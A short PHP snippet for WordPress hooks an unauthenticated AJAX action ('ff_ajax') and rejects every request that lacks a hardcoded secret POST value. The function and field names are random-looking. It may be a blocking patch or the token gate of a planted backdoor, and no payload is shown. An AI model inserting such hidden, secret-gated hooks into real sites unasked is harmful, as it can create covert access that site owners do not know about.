<?php

function viewer_reloaded_make() {
	if (!isset($_POST["kvbrdxwea"]) || $_POST["kvbrdxwea"] !== "jnj4B4ZOqPQqUF") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'viewer_reloaded_make', 5, 1);
